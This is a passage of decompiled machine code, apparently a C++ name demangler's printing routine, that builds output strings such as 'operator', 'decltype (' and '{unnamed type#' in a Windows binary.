0;\n            }\n            else {\n                ppppppppcVar9 = iVar11 + 1;\n            }\n            *(arg1 + 0x100) = ppppppppcVar9;\n            arg1[iVar11] = 0x7d;\n            arg1[0x108] = 0x7d;\n        }\n        break;\n    case 0x405611:\n        *(arg1 + 0x130) = 1;\n        break;\n    case 0x405620:\n        ppppppppcVar9 = arg3[2];\n        if (*ppppppppcVar9 == 0x37) {\n            pppppppcVar22 = arg3[1];\n            ppppppcVar19 = pppppppcVar22[1];\n            pppppcVar21 = *ppppppcVar19;\n            if ((*(pppppcVar21 + 1) == 99) && ((*pppppcVar21 + 0x9d < 2 || (*pppppcVar21 + 0x8e < 2)))) {\n                fcn.00409360(arg1, arg2_00, pppppppcVar22);\n                fcn.00401cf0(arg1, 0x3c);\n                fcn.00407f90(arg1, arg2_00, arg3[2][1]);\n                fcn.004046f0(arg1, 0x42db2e);\n                fcn.00407f90(arg1, arg2_00, arg3[2][2]);\n                ppppppppcVar9 = fcn.00401cf0(arg1, 0x29);\n                return ppppppppcVar9;\n            }\n            uVar28 = *pppppppcVar22 < 0x31;\n            uVar30 = *pppppppcVar22 == 0x31;\n            if (uVar30) {\n                uVar28 = *(ppppppcVar19 + 2) == 0;\n                uVar30 = *(ppppppcVar19 + 2) == 1;\n                if (uVar30) {\n                    uVar28 = *ppppppcVar19[1] < 0x3e;\n                    uVar30 = *ppppppcVar19[1] == 0x3e;\n                    if (uVar30) {\n                        fcn.00401cf0(arg1, 0x28);\n                        pppppcVar21 = *arg3[1][1];\n                        ppppppppcVar9 = arg3[2];\n                    }\n                }\n            }\n            iVar11 = 3;\n            pppppppcVar22 = ppppppppcVar9[1];\n            puVar25 = 0x42d8c2;\n            do {\n                if (iVar11 == 0) break;\n                iVar11 = iVar11 + -1;\n                uVar28 = *pppppcVar21 < *puVar25;\n                uVar30 = *pppppcVar21 == *puVar25;\n                pppppcVar21 = pppppcVar21 + 1;\n                puVar25 = puVar25 + 1;\n            } while (uVar30);\n            uVar28 = (!uVar28 && !uVar30) == uVar28;\n            if ((uVar28) && (uVar28 = *pppppppcVar22 == 3,  uVar28)) {\n                uVar28 = *pppppppcVar22[2] == 0x29;\n                if (!uVar28) {\n                    *(arg1 + 0x130) = 1;\n                }\n                fcn.00409420(arg1, arg2_00, pppppppcVar22[1]);\n            }\n            else {\n                fcn.00409420(arg1, arg2_00, pppppppcVar22);\n            }\n            iVar11 = 3;\n            pppppcVar21 = *arg3[1][1];\n            pppppcVar20 = pppppcVar21;\n            pcVar17 = 0x42da84;\n            do {\n                if (iVar11 == 0) break;\n                iVar11 = iVar11 + -1;\n                uVar28 = *pppppcVar20 == *pcVar17;\n                pppppcVar20 = pppppcVar20 + 1;\n                pcVar17 = pcVar17 + 1;\n            } while (uVar28);\n            if (uVar28) {\n                fcn.00401cf0(arg1, 0x5b);\n                fcn.00407f90(arg1, arg2_00, arg3[2][2]);\n                fcn.00401cf0(arg1, 0x5d);\n            }\n            else {\n                iVar11 = 3;\n                pcVar17 = 0x42d8c2;\n                do {\n                    if (iVar11 == 0) break;\n                    iVar11 = iVar11 + -1;\n                    uVar28 = *pppppcVar21 == *pcVar17;\n                    pppppcVar21 = pppppcVar21 + 1;\n                    pcVar17 = pcVar17 + 1;\n                } while (uVar28);\n                if (!uVar28) {\n                    fcn.00409360(arg1, arg2_00, arg3[1]);\n                }\n                fcn.00409420(arg1, arg2_00, arg3[2][2]);\n            }\n            ppppppppcVar9 = arg3[1];\n            if (*ppppppppcVar9 != 0x31) {\n                return ppppppppcVar9;\n            }\n            ppppppppcVar9 = ppppppppcVar9[1];\n            if (*(ppppppppcVar9 + 2) != 1) {\n                return ppppppppcVar9;\n            }\n            if (*ppppppppcVar9[1] != '>') {\n                return ppppppppcVar9[1];\n            }\n            ppppppppcVar9 = fcn.00401cf0(arg1, 0x29);\n            return ppppppppcVar9;\n        }\n        goto code_r0x0040562d;\n    case 0x405640:\n        pppppppcVar22 = arg3[1];\n        pppppppcVar16 = arg3[2];\n        bVar29 = *pppppppcVar22 == 0x31;\n        if (bVar29) {\n            iVar11 = 3;\n            pppppcVar21 = *pppppppcVar22[1];\n            pppppcVar20 = pppppcVar21;\n            pcVar17 = 0x42da7e;\n            do {\n                if (iVar11 == 0) break;\n                iVar11 = iVar11 + -1;\n                bVar29 = *pppppcVar20 == *pcVar17;\n                pppppcVar20 = pppppcVar20 + 1;\n                pcVar17 = pcVar17 + 1;\n            } while (bVar29);\n            if ((bVar29) && (*pppppppcVar16 == 3)) {\n                if ((*pppppppcVar16[1] == 1) && (*pppppppcVar16[2] == 0x29)) {\n                    pppppppcVar16 = pppppppcVar16[1];\n                }\n            }\n            else if (*pppppppcVar16 == 0x37) {\n                fcn.00409420(arg1, arg2_00, pppppppcVar16[1]);\n                ppppppppcVar9 = fcn.00409360(arg1, arg2_00, pppppppcVar22);\n                return ppppppppcVar9;\n            }\n            fcn.00409360(arg1, arg2_00, pppppppcVar22);\n            bVar29 = pppppcVar21 == NULL;\n            if (!bVar29) {\n                iVar11 = 3;\n                pppppcVar20 = pppppcVar21;\n                pcVar17 = 0x42da81;\n                do {\n                    if (iVar11 == 0) break;\n                    iVar11 = iVar11 + -1;\n                    bVar29 = *pppppcVar20 == *pcVar17;\n                    pppppcVar20 = pppppcVar20 + 1;\n                    pcVar17 = pcVar17 + 1;\n                } while (bVar29);\n                if (bVar29) {\n                    ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, pppppppcVar16);\n                    return ppppppppcVar9;\n                }\n                iVar11 = 3;\n                pcVar17 = 0x42d8bf;\n                do {\n                    if (iVar11 == 0) break;\n                    iVar11 = iVar11 + -1;\n                    bVar29 = *pppppcVar21 == *pcVar17;\n                    pppppcVar21 = pppppcVar21 + 1;\n                    pcVar17 = pcVar17 + 1;\n                } while (bVar29);\n                if (bVar29) {\n                    iVar11 = *(arg1 + 0x100);\n                    if (iVar11 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar11 = 0;\n                    }\n                    *(arg1 + 0x100) = iVar11 + 1;\n                    arg1[iVar11] = 0x28;\n                    arg1[0x108] = 0x28;\n                    fcn.00407f90(arg1, arg2_00, pppppppcVar16);\n                    ppppppppcVar9 = *(arg1 + 0x100);\n                    if (ppppppppcVar9 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        ppppppppcVar9 = NULL;\n                    }\n                    *(arg1 + 0x100) = ppppppppcVar9 + 1;\n                    arg1[ppppppppcVar9] = 0x29;\n                    arg1[0x108] = 0x29;\n                    return ppppppppcVar9;\n                }\n            }\n        }\n        else if (*pppppppcVar22 == 0x33) {\n            iVar11 = *(arg1 + 0x100);\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 1;\n                iVar11 = 0;\n            }\n            else {\n                iVar12 = iVar11 + 1;\n            }\n            *(arg1 + 0x100) = iVar12;\n            arg1[iVar11] = 0x28;\n            arg1[0x108] = 0x28;\n            fcn.004090e0(arg1, arg2_00, pppppppcVar22 + 1);\n            iVar11 = *(arg1 + 0x100);\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 1;\n                iVar11 = 0;\n            }\n            else {\n                iVar12 = iVar11 + 1;\n            }\n            *(arg1 + 0x100) = iVar12;\n            arg1[iVar11] = 0x29;\n            arg1[0x108] = 0x29;\n        }\n        else {\n            fcn.00409360(arg1, arg2_00, pppppppcVar22);\n        }\n        ppppppppcVar9 = fcn.00409420(arg1, arg2_00, pppppppcVar16);\n        break;\n    case 0x405680:\n        ppppppppcVar9 = fcn.00409360(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405693:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"operator \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.004090e0(arg1, arg2_00, arg3 + 1);\n        break;\n    case 0x405710:\n        pppppppcVar22 = arg3[1];\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"operator\";\n        iVar26 = *(pppppppcVar22 + 2);\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppcVar19 = pppppppcVar22[1];\n        ppppppppcVar9 = *ppppppcVar19 - 0x61;\n        if (*ppppppcVar19 - 0x61 < 0x1a) {\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppppppppcVar9 = 0x1;\n                iVar11 = 0;\n            }\n            else {\n                ppppppppcVar9 = iVar11 + 1;\n            }\n            *(arg1 + 0x100) = ppppppppcVar9;\n            arg1[iVar11] = 0x20;\n            arg1[0x108] = 0x20;\n            ppppppcVar19 = pppppppcVar22[1];\n        }\n        iVar11 = iVar26;\n        if (*(ppppppcVar19 + iVar11 + -1) == 0x20) {\n            iVar11 = iVar26 + -1;\n        }\n        if (iVar11 != 0) {\n            ppppppppcVar15 = *(arg1 + 0x100);\n            ppppppcVar14 = ppppppcVar19 + iVar11;\n            do {\n                uVar1 = *ppppppcVar19;\n                if (ppppppppcVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppppppppcVar9 = NULL;\n                    ppppppppcVar15 = 0x1;\n                }\n                else {\n                    ppppppppcVar9 = ppppppppcVar15;\n                    ppppppppcVar15 = ppppppppcVar15 + 1;\n                }\n                ppppppcVar19 = ppppppcVar19 + 1;\n                *(arg1 + 0x100) = ppppppppcVar15;\n                arg1[ppppppppcVar9] = uVar1;\n                arg1[0x108] = uVar1;\n            } while (ppppppcVar19 != ppppppcVar14);\n        }\n        break;\n    case 0x405790:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"operator \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        break;\n    case 0x405810:\n        pppppppcVar22 = arg3[2];\n        if (arg3[1] != NULL) {\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n        }\n        iVar11 = *(arg1 + 0x100);\n        if (iVar11 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar12 = 1;\n            iVar11 = 0;\n        }\n        else {\n            iVar12 = iVar11 + 1;\n        }\n        *(arg1 + 0x100) = iVar12;\n        arg1[iVar11] = 0x7b;\n        arg1[0x108] = 0x7b;\n        fcn.00407f90(arg1, arg2_00, pppppppcVar22);\n        ppppppppcVar9 = *(arg1 + 0x100);\n        if (ppppppppcVar9 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar11 = 1;\n            ppppppppcVar9 = NULL;\n        }\n        else {\n            iVar11 = ppppppppcVar9 + 1;\n        }\n        *(arg1 + 0x100) = iVar11;\n        arg1[ppppppppcVar9] = 0x7d;\n        arg1[0x108] = 0x7d;\n        break;\n    case 0x405890:\n        if (arg3[1] != NULL) {\n            ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        }\n        if (arg3[2] != NULL) {\n            uVar7 = *(arg1 + 0x100);\n            if (0xfd < uVar7) {\n                arg1[uVar7] = 0;\n                (**(arg1 + 0x110))(arg1, uVar7, *(arg1 + 0x118));\n                *(arg1 + 0x100) = 0;\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                uVar7 = 0;\n            }\n            puVar18 = 0x42da68;\n            do {\n                uVar28 = *puVar18;\n                if (uVar7 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    uVar10 = 0;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar10 = uVar7;\n                    uVar7 = uVar7 + 1;\n                }\n                puVar18 = puVar18 + 1;\n                *(arg1 + 0x100) = uVar7;\n                arg1[uVar10] = uVar28;\n                arg1[0x108] = uVar28;\n            } while (puVar18 != 0x42da6a);\n            iVar26 = *(arg1 + 0x138);\n            ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            if ((iVar26 == *(arg1 + 0x138)) && (*(arg1 + 0x100) == uVar7)) {\n                *(arg1 + 0x100) = uVar7 - 2;\n            }\n        }\n        break;\n    case 0x405931:\n        if (*(arg3 + 0x12) != 0) {\n            iVar11 = *(arg1 + 0x100);\n            pcVar17 = \"_Sat \";\n            do {\n                cVar23 = *pcVar17;\n                if (iVar11 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar12 = 0;\n                    iVar11 = 1;\n                }\n                else {\n                    iVar12 = iVar11;\n                    iVar11 = iVar11 + 1;\n                }\n                pcVar17 = pcVar17 + 1;\n                *(arg1 + 0x100) = iVar11;\n                arg1[iVar12] = cVar23;\n                arg1[0x108] = cVar23;\n            } while (pcVar17 != \"\");\n        }\n        if (arg3[1][1] == 0x42ea20) {\n            ppppppppcVar15 = *(arg1 + 0x100);\n        }\n        else {\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n            iVar11 = *(arg1 + 0x100);\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppppppppcVar15 = 0x1;\n                iVar11 = 0;\n            }\n            else {\n                ppppppppcVar15 = iVar11 + 1;\n            }\n            *(arg1 + 0x100) = ppppppppcVar15;\n            arg1[iVar11] = 0x20;\n            arg1[0x108] = 0x20;\n        }\n        if (*(arg3 + 2) == 0) {\n            pcVar17 = \"_Fract\";\n            do {\n                cVar23 = *pcVar17;\n                if (ppppppppcVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppppppppcVar9 = NULL;\n                    ppppppppcVar15 = 0x1;\n                }\n                else {\n                    ppppppppcVar9 = ppppppppcVar15;\n                    ppppppppcVar15 = ppppppppcVar15 + 1;\n                }\n                pcVar17 = pcVar17 + 1;\n                *(arg1 + 0x100) = ppppppppcVar15;\n                arg1[ppppppppcVar9] = cVar23;\n                arg1[0x108] = cVar23;\n            } while (pcVar17 != \"\");\n        }\n        else {\n            pcVar17 = \"_Accum\";\n            do {\n                cVar23 = *pcVar17;\n                if (ppppppppcVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppppppppcVar9 = NULL;\n                    ppppppppcVar15 = 0x1;\n                }\n                else {\n                    ppppppppcVar9 = ppppppppcVar15;\n                    ppppppppcVar15 = ppppppppcVar15 + 1;\n                }\n                pcVar17 = pcVar17 + 1;\n                *(arg1 + 0x100) = ppppppppcVar15;\n                arg1[ppppppppcVar9] = cVar23;\n                arg1[0x108] = cVar23;\n            } while (pcVar17 != \"\");\n        }\n        break;\n    case 0x405a00:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"decltype (\";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        ppppppppcVar9 = *(arg1 + 0x100);\n        if (ppppppppcVar9 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar11 = 1;\n            ppppppppcVar9 = NULL;\n        }\n        else {\n            iVar11 = ppppppppcVar9 + 1;\n        }\n        *(arg1 + 0x100) = iVar11;\n        arg1[ppppppppcVar9] = 0x29;\n        arg1[0x108] = 0x29;\n        break;\n    case 0x405a80:\n        ppppppppcVar15 = appppppppcStack200;\n        sub.msvcrt.dll_sprintf(ppppppppcVar15, 0x42d8e5, *(arg3 + 1));\n        ppppppppcVar9 = ppppppppcVar15;\n        do {\n            ppppppppcVar8 = ppppppppcVar9;\n            uVar5 = *ppppppppcVar8 + 0xfefefeff & ~*ppppppppcVar8;\n            uVar6 = uVar5 & 0x80808080;\n            ppppppppcVar9 = ppppppppcVar8 + 4;\n        } while (uVar6 == 0);\n        bVar29 = (uVar5 & 0x8080) == 0;\n        if (bVar29) {\n            uVar6 = uVar6 >> 0x10;\n        }\n        if (bVar29) {\n            ppppppppcVar9 = ppppppppcVar8 + 6;\n        }\n        puVar18 = ppppppppcVar9 + ((-3 - CARRY1(uVar6, uVar6)) - ppppppppcVar15);\n        ppppppppcVar9 = uVar6 & 0xffffff00;\n        if (puVar18 != NULL) {\n            ppppppppcVar8 = *(arg1 + 0x100);\n            ppppppppcVar13 = puVar18 + ppppppppcVar15;\n            do {\n                uVar28 = *ppppppppcVar15;\n                if (ppppppppcVar8 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppppppppcVar9 = NULL;\n                    ppppppppcVar8 = 0x1;\n                }\n                else {\n                    ppppppppcVar9 = ppppppppcVar8;\n                    ppppppppcVar8 = ppppppppcVar8 + 1;\n                }\n                ppppppppcVar15 = ppppppppcVar15 + 1;\n                *(arg1 + 0x100) = ppppppppcVar8;\n                arg1[ppppppppcVar9] = uVar28;\n                arg1[0x108] = uVar28;\n            } while (ppppppppcVar15 != ppppppppcVar13);\n        }\n        break;\n    case 0x405b40:\n        ppppppppcVar9 = *(arg1 + 0x100);\n        uVar6 = *(arg3 + 1);\n        if (ppppppppcVar9 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar11 = 1;\n            ppppppppcVar9 = NULL;\n        }\n        else {\n            iVar11 = ppppppppcVar9 + 1;\n        }\n        *(arg1 + 0x100) = iVar11;\n        arg1[ppppppppcVar9] = uVar6;\n        arg1[0x108] = uVar6;\n        break;\n    case 0x405b72:\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        break;\n    case 0x405b93:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"java resource \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405c10:\n        uVar5 = 0;\n        if (*arg3[1] == 0x27) {\n            uVar5 = *(arg3[1][1] + 0x1c);\n            if (uVar5 != 0) {\n                if (uVar5 < 7) {\n                    pppppppcVar22 = arg3[2];\n                    if (*pppppppcVar22 == 0) {\n                        if (uVar6 == 0x3c) {\n                            fcn.00401cf0(arg1, 0x2d);\n                            pppppppcVar22 = arg3[2];\n                        }\n                        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, pppppppcVar22);\n                        if (6 < uVar5) {\n                            return ppppppppcVar9;\n                        }\n                        ppppppppcVar9 = *(uVar5 * 4 + 0x42dc64) + 0x42dc64;\n    // switch table (7 cases) at 0x42dc64\n                        switch(ppppppppcVar9) {\n                        case 0x404830:\n                            return ppppppppcVar9;\n                        case 0x4077dc:\n                            ppppppppcVar9 = fcn.004046f0(arg1, 0x42da96);\n                            return ppppppppcVar9;\n                        case 0x4077f0:\n                            ppppppppcVar9 = fcn.004046f0(arg1, 0x42da93);\n                            return ppppppppcVar9;\n                        case 0x407804:\n                            ppppppppcVar9 = fcn.004046f0(arg1, 0x42da90);\n                            return ppppppppcVar9;\n                        case 0x407818:\n                            ppppppppcVar9 = fcn.00401cf0(arg1, 0x6c);\n                            return ppppppppcVar9;\n                        case 0x40782a:\n                            ppppppppcVar9 = fcn.00401cf0(arg1, 0x75);\n                            return ppppppppcVar9;\n                        }\n                    }\n                }\n                else if ((((uVar5 == 7) && (pppppppcVar22 = arg3[2],  *pppppppcVar22 == 0)) &&\n                         (*(pppppppcVar22 + 2) == 1)) && (uVar6 == 0x3b)) {\n                    if (*pppppppcVar22[1] == '0') {\n                        ppppppppcVar9 = fcn.004046f0(arg1, \"false\");\n                        return ppppppppcVar9;\n                    }\n                    if (*pppppppcVar22[1] == '1') {\n                        ppppppppcVar9 = fcn.004046f0(arg1, \"true\");\n                        return ppppppppcVar9;\n                    }\n                }\n            }\n        }\n        iVar11 = *(arg1 + 0x100);\n        if (iVar11 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar12 = 1;\n            iVar11 = 0;\n        }\n        else {\n            iVar12 = iVar11 + 1;\n        }\n        *(arg1 + 0x100) = iVar12;\n        arg1[iVar11] = 0x28;\n        arg1[0x108] = 0x28;\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar11 = *(arg1 + 0x100);\n        if (iVar11 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            *arg1 = 0x29;\n            arg1[0x108] = 0x29;\n            uVar6 = *arg3;\n            *(arg1 + 0x100) = 1;\n            if (uVar6 == 0x3c) {\n                iVar12 = 1;\n                goto code_r0x004076d6;\n            }\n        }\n        else {\n            iVar12 = iVar11 + 1;\n            *(arg1 + 0x100) = iVar12;\n            arg1[iVar11] = 0x29;\n            arg1[0x108] = 0x29;\n            if (*arg3 == 0x3c) {\n                if (iVar12 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar12 = 0;\n                }\ncode_r0x004076d6:\n                *(arg1 + 0x100) = iVar12 + 1;\n                arg1[iVar12] = 0x2d;\n                arg1[0x108] = 0x2d;\n            }\n        }\n        if (uVar5 == 8) {\n            iVar11 = *(arg1 + 0x100);\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar11 = 0;\n            }\n            *(arg1 + 0x100) = iVar11 + 1;\n            arg1[iVar11] = 0x5b;\n            arg1[0x108] = 0x5b;\n            fcn.00407f90(arg1, arg2_00, arg3[2]);\n            ppppppppcVar9 = *(arg1 + 0x100);\n            if (ppppppppcVar9 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppppppppcVar9 = NULL;\n            }\n            *(arg1 + 0x100) = ppppppppcVar9 + 1;\n            arg1[ppppppppcVar9] = 0x5d;\n            arg1[0x108] = 0x5d;\n        }\n        else {\n            ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        }\n        break;\n    case 0x405cd2:\n        *(arg1 + 0x130) = 1;\n        break;\n    case 0x405ce1:\n        ppppppppcVar9 = arg3[2];\n        if (*ppppppppcVar9 == 0x39) {\n            pppppppcVar22 = ppppppppcVar9[2];\n            bVar29 = *pppppppcVar22 == 0x3a;\n            if (bVar29) {\n                pppppppcVar16 = arg3[1];\n                pppppppcVar27 = ppppppppcVar9[1];\n                iVar11 = 3;\n                ppppppcVar19 = pppppppcVar22[1];\n                ppppppcVar14 = pppppppcVar22[2];\n                pppppcVar21 = *pppppppcVar16[1];\n                pcVar17 = 0x42d8cb;\n                do {\n                    if (iVar11 == 0) break;\n                    iVar11 = iVar11 + -1;\n                    bVar29 = *pppppcVar21 == *pcVar17;\n                    pppppcVar21 = pppppcVar21 + 1;\n                    pcVar17 = pcVar17 + 1;\n                } while (bVar29);\n                if (bVar29) {\n                    fcn.00409420(arg1, arg2_00, pppppppcVar27);\n                    fcn.00409360(arg1, arg2_00, pppppppcVar16);\n                    fcn.00409420(arg1, arg2_00, ppppppcVar19);\n                    fcn.004046f0(arg1, 0x42da87);\n                    ppppppppcVar9 = fcn.00409420(arg1, arg2_00, ppppppcVar14);\n                    return ppppppppcVar9;\n                }\n                fcn.004046f0(arg1, \"new \");\n                if (pppppppcVar27[1] != NULL) {\n                    fcn.00409420(arg1, arg2_00, pppppppcVar27);\n                    fcn.00401cf0(arg1, 0x20);\n                }\n                ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, ppppppcVar19);\n                if (ppppppcVar14 == NULL) {\n                    return ppppppppcVar9;\n                }\n                ppppppppcVar9 = fcn.00409420(arg1, arg2_00, ppppppcVar14);\n                return ppppppppcVar9;\n            }\n        }\ncode_r0x0040562d:\n        *(arg1 + 0x130) = 1;\n        break;\n    case 0x405d80:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"{unnamed type#\";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = appppppppcStack200;\n        sub.msvcrt.dll_sprintf(ppppppppcVar9, 0x42d8e5, *(arg3 + 1) + 1);\n        ppppppppcVar15 = ppppppppcVar9;\n        do {\n            ppppppppcVar8 = ppppppppcVar15;\n            uVar5 = *ppppppppcVar8 + 0xfefefeff & ~*ppppppppcVar8;\n            uVar6 = uVar5 & 0x80808080;\n            ppppppppcVar15 = ppppppppcVar8 + 4;\n        } while (uVar6 == 0);\n        bVar29 = (uVar5 & 0x8080) == 0;\n        if (bVar29) {\n            uVar6 = uVar6 >> 0x10;\n        }\n        if (bVar29) {\n            ppppppppcVar15 = 